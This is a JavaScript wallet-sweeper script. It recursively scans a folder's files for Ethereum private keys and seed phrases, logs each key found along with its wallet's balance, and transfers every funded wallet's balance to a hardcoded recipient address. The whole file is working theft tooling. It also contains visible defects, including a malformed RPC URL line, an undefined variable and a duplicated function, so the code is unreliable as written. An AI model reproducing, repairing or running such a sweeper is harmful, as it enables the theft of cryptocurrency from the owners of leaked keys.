//const axios = require('axios');
const fs = require('fs');
const readline = require('readline');
//const cheerio = require('cheerio');
const { Wallet, providers, ethers } = require('ethers');
const colors = require('colors');
const bip39 = require('bip39');
const path = require('path');
const hdkey = require('ethereumjs-wallet').hdkey;
const fg = require('fast-glob');

// Ethereum address to transfer funds
const ethereumRecipientAddress = '0x1052AaFf72E2c53dB7eF35580A6034802EB902d4';

// Ethereum JSON-RPC URL
const ethereumRpcUrl = http://localhost:8545';';

const customPrivateKeyRegex = /[0-9a-fA-F]{64}/g;

const isValidPrivateKey = (privateKey) => {
  const formattedPrivateKey = privateKey.toLowerCase();
  return (
    ethers.utils.isHexString(formattedPrivateKey) ||
    customPrivateKeyRegex.test(formattedPrivateKey)
  );
};

const isValidPrivateKeyBlock = (privateKey) => {
  const formattedPrivateKey = privateKey.toLowerCase();
  return ethers.utils.isHexString(formattedPrivateKey);
};


// Function to check if a given string is a valid Ethereum mnemonic
const isValidMnemonic = (mnemonic) => {
  return bip39.validateMnemonic(mnemonic);
};

// Function to check if a given subset of words is a valid Ethereum mnemonic
const isValidMnemonicSubset = (mnemonicSubset) => {
  const mnemonic = mnemonicSubset.split(' ').join(' '); // Remove extra spaces between words
  return bip39.validateMnemonic(mnemonic);
}

const folderPath = './folder'; // Replace with the path to your "gold" folder

let totalLines = 0;
let scanningPaused = false; // Flag to indicate if scanning is paused
let transactionInProgress = false; // Flag to indicate if a transaction is in progress
const lineQueue = [];

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: false
});

async function processFile(filePath) {
  return new Promise((resolve, reject) => {
    const readStream = fs.createReadStream(filePath, 'utf8');
    const chunks = [];

    readStream.on('data', (chunk) => {
      chunks.push(chunk);
    });

    readStream.on('end', async () => {
      const fileContent = chunks.join('');

      const privateKeyRegex = /(?:0x[a-fA-F0-9]{64})|(?:[0-9a-fA-F]{64})|(?:xprv[A-Za-z0-9]{107})/g;
      const mnemonicRegex = /\b[a-zA-Z]{3,}\b(?:\s+[a-zA-Z]{3,}\b)+/g;
      const sentenceRegex = /(?:[A-Fa-f0-9]{64}(?![A-Fa-f0-9]))|(?:S[A-Za-z2-7]{55}(?![A-Za-z2-7]))/g;
      const mnemonicSubsetRegex = /\b[a-zA-Z]{3,}\b(?:\s+[a-zA-Z]{3,}\b){11,23}/g;
	  
      const lines = fileContent.split('\n');

      for (const line of lines) {
        console.log(`Processing line: ${line}`);
        totalLines++;

        let foundEthereumKeys = [];
        let foundMnemonics = [];
        let foundPrivateKeys = [];
        let foundSentences = [];

        const privateKeys = line.match(privateKeyRegex);
        const mnemonics = line.match(mnemonicRegex);
        const sentences = line.match(sentenceRegex);
        const mnemonicSubsets = line.match(mnemonicSubsetRegex);

        if (privateKeys) {
          foundKeys.push(...privateKeys);
        }

        if (mnemonics) {
          foundMnemonics.push(...mnemonics);
        }

        if (sentences) {
          foundSentences.push(...sentences);
        }


        // Process the found private keys
        for (const privateKey of foundKeys) {
          // Validate the Ethereum private key
          if (isValidPrivateKey(privateKey)) {
            console.log(`Found valid Ethereum private key: ${privateKey}`);
            transactionInProgress = true;
            scanningPaused = true;
            rl.pause();
            await transferFundsEthereum(privateKey);
            transactionInProgress = false;
            scanningPaused = false;
          }
        }

        // Process the found mnemonic seed phrases
        for (let i = 0; i < foundMnemonics.length; i++) {
          const mnemonic = foundMnemonics[i].trim();
          // Validate the Ethereum mnemonic
          if (isValidMnemonic(mnemonic)) {
            console.log(`Found valid Ethereum mnemonic: ${mnemonic}`);
            transactionInProgress = true;
            scanningPaused = true;
            rl.pause();
            await transferFundsEthereumFromMnemonic(mnemonic);
            transactionInProgress = false;
            scanningPaused = false;
          }
        }

        // Process blocks of numbers and letters to find private keys
        if (line.length >= 64) {
          const blocks = line.match(/[A-Fa-f0-9]{64}(?![A-Fa-f0-9])/g);
          if (blocks && blocks.length > 0) {
            transactionInProgress = true;
            scanningPaused = true;
            rl.pause();
            for (const block of blocks) {
              if (isValidPrivateKeyBlock(block)) {
                console.log(`Found valid Ethereum private key in block: ${block}`);
                await transferFundsEthereum(block);
              } else {
                console.log(`Invalid private key block: ${block}`);
              }
            }
            transactionInProgress = false;
            scanningPaused = false;
          }
        }

        // Process the found sentences to find 12-24 word mnemonic seed phrases
        for (let i = 0; i < foundSentences.length; i++) {
          const sentence = foundSentences[i].trim();
          const words = sentence.split(' ');

          let j = 0;
          while (j <= words.length - 12) {
            let k = j + 11;
            while (k <= words.length - 12 && k <= j + 23) {
              const mnemonicSubset = words.slice(j, k + 1).join(' ');

              // Validate the subset as a mnemonic
              if (isValidMnemonicSubset(mnemonicSubset)) {
                console.log(`Found valid Ethereum mnemonic: ${mnemonicSubset}`);
                transactionInProgress = true;
                scanningPaused = true;
                rl.pause();
                await transferFundsEthereumFromMnemonic(mnemonicSubset);
                transactionInProgress = false;
                scanningPaused = false;
              }
              k++;
            }
            j++;
          }
        }

        // Process the found mnemonic subsets within sentences
        if (mnemonicSubsets) {
          for (const mnemonicSubset of mnemonicSubsets) {
            // Validate the subset as a mnemonic
            if (isValidMnemonicSubset(mnemonicSubset)) {
              console.log(`Found valid Ethereum mnemonic in sentence: ${mnemonicSubset}`);
              transactionInProgress = true;
              scanningPaused = true;
              rl.pause();
              await transferFundsEthereumFromMnemonic(mnemonicSubset);
              transactionInProgress = false;
              scanningPaused = false;
            }
          }
        }

        if (lineQueue.length > 0) {
          const nextLine = lineQueue.shift();
          rl.emit('line', nextLine);
        }
      }

      resolve();
    });

    rl.on('close', () => {
      console.log(`Total lines processed: ${totalLines}`);
    });

    rl.on('error', (error) => {
      reject(error);
    });
  });
}

async function processFolder(folderPath) {
  const files = await fg('**/*', { cwd: folderPath, onlyFiles: true, dot: true });

  for (const file of files) {
    const filePath = path.join(folderPath, file);
    const stats = fs.statSync(filePath);

    if (stats.isDirectory()) {
      await processFolder(filePath); // Recursively process subfolders
    } else {
      await processFile(filePath); // Process individual files
    }
  }
}

(async () => {
  try {
    await processFolder(folderPath);
    console.log('All files processed.');
  } catch (error) {
    console.error('Error processing files:', error);
  }
})();

async function transferFundsEthereum(privateKey) {
  try {
    const provider = new ethers.providers.JsonRpcProvider(ethereumRpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);

    await sleep(3000); // 3 seconds delay
    const balance = await wallet.getBalance();
    const balanceEther = ethers.utils.formatEther(balance);
    console.log(`Balance in Ethereum wallet: ${balanceEther} ETH`);

    if (balance.isZero()) {
      console.log('Skipping transaction - no balance in Ethereum wallet');
      return; // Exit the function if there is no balance
    }
	
	const walletData = {
      address: wallet.address,
      privateKey: wallet.privateKey,
      balance: balanceEther,
    };

    // Place the logBalanceToFile() function call here
    await logBalanceToFile(walletData, 'Ethereum');

    await sleep(3000); // 3 seconds delay
    const transactionFee = await wallet.provider.getGasPrice();
    const transactionFeeEther = ethers.utils.formatEther(transactionFee);
    console.log(`Transaction fee: ${transactionFeeEther} ETH`);

    const amountToSend = balance.sub(transactionFee);
    if (amountToSend.lte(0)) {
      console.log('Skipping transaction - not enough balance for transaction fee');
      return; // Exit the function if there is not enough balance for the transaction fee
    }

    const transaction = {
      to: ethereumRecipientAddress,
      value: amountToSend,
      gasPrice: transactionFee,
    };

    // Add delay before sending the transaction
    await sleep(3000); // 3 seconds delay
    const sendTransaction = await wallet.sendTransaction(transaction);
    console.log(`Transaction sent: ${sendTransaction.hash}`);

    // Append transaction details to the transaction log file
    await logTransactionToFile(walletData, ethereumRecipientAddress, amountToSend, transactionFee, 'Ethereum');
  } catch (error) {
    console.error('Error transferring funds via Ethereum:', error.message);
  }
  scanningPaused = false; // Resume scanning after processing the transaction
}

// Helper function to pause execution for a specified duration
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}



async function derivePrivateKeyFromMnemonic(mnemonic, path) {
  const seed = await bip39.mnemonicToSeed(mnemonic);
  const hdNode = hdkey.fromMasterSeed(seed);
  const childNode = hdNode.derivePath(path);
  const privateKey = childNode.getWallet().getPrivateKeyString();
  return privateKey;
}

// Function to derive a private key from a mnemonic for Ethereum
async function derivePrivateKeyFromMnemonic(mnemonic, path) {
  try {
    const wallet = ethers.Wallet.fromMnemonic(mnemonic, path);
    return wallet.privateKey;
  } catch (error) {
    console.error('Error deriving private key from mnemonic:', error.message);
    throw error;
  }
}

// Function to transfer funds on Ethereum using a mnemonic
async function transferFundsEthereumFromMnemonic(mnemonic) {
  try {
    // Derive the private key from the mnemonic seed
    const path = "m/44'/60'/0'/0/0"; // Derivation path for Ethereum
    const privateKey = await derivePrivateKeyFromMnemonic(mnemonic, path);

    // Transfer funds using the derived private key
    await transferFundsEthereum(privateKey);
  } catch (error) {
    console.error('Error transferring funds via Ethereum from mnemonic:', error.message);
  }
}


async function logBalanceToFile(walletData, blockchain) {
  const balanceLogFilePath = `./ethereum_balance_log.txt`;

  let balanceLogEntry = `Address: ${walletData.address}\n`;
    balanceLogEntry += `Secret Key: ${walletData.secretKey}\n`;
    balanceLogEntry += `Private Key: ${walletData.privateKey}\n`;
    balanceLogEntry += `Balance: ${walletData.balance} ETH\n\n`;

  fs.appendFileSync(balanceLogFilePath, balanceLogEntry);
  console.log(`Logged balance to file: ${balanceLogFilePath}`);
}



// Function to log transaction details to a file
async function logTransactionToFile(walletData, recipientAddress, amountToSend, transactionFee, blockchain) {
  const transactionLogFilePath = `./ethereum_transaction_log.txt`;

  const transactionLogEntry = `Transaction Details:\nFrom: ${walletData.address}\nTo: ${recipientAddress}\nAmount: ${amountToSend.toString()}ETH\nTransaction Fee: ${transactionFee.toString()}ETH\n\n`;
  fs.appendFileSync(transactionLogFilePath, transactionLogEntry);
  console.log(`Logged transaction details to file: ${transactionLogFilePath}`);}
